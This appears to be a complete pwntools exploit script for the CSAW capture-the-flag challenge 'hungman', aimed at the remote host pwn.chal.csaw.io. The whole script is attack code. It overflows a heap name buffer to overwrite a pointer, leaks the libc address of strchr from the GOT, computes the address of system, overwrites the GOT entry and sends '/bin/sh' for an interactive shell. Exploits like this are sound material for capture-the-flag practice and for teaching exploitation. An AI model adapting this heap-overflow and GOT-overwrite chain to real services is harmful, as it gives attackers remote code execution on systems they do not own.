#!/usr/bin/python

from pwn import *

MODE = 'r'
DEBUG = True

strchr_got = 0x602038
name_len = 0x30

printf_addr = 0x400856
snprintf_addr = 0x400866
memset_addr = 0x400876

if MODE == 'l':
  #p = remote("localhost", 4924)
  p = process("./hungman")

  strchr_offset = 0x86d40
  system_offset = 0x46590

else:
  p = remote("pwn.chal.csaw.io", 8003)

  strchr_offset = 0x89080
  system_offset = 0x45380

def r(msg):
  response = p.recvuntil(msg) 
  if DEBUG:
    log.info(response)
  return response

def send_name(name):
  r("name?\n")
  p.sendline(name)

def do_hungman():
  for i in range(ord('a'), ord('z') + 1):
    response = r("\n")

    if response.find("name?") >= 0:
      break

    p.sendline(chr(i))

send_name("A" * (name_len))
r("AAAA\n")

do_hungman()

p.sendline('y')

payload = "A" * name_len
payload += "B" * 0x10 # Chunk header
payload += "CCCC" # Score
payload += p32(40) # Size
payload += p64(strchr_got)

p.sendline(payload)

r("player:")
response = r("Continue?")

strchr_leak = u64(response[1:7].ljust(8, '\x00'))

system_addr = strchr_leak - strchr_offset + system_offset

log.info("Leaked strchr address: %x" % strchr_leak)

p.sendline('y')

do_hungman()

p.sendline('y')

payload = p64(system_addr)
payload += p64(printf_addr)
payload += p64(snprintf_addr)
payload += p64(memset_addr)

p.sendline(payload)

p.sendline('y')

do_hungman()

p.sendline('y')
p.sendline("/bin/sh")

p.interactive()

p.close()
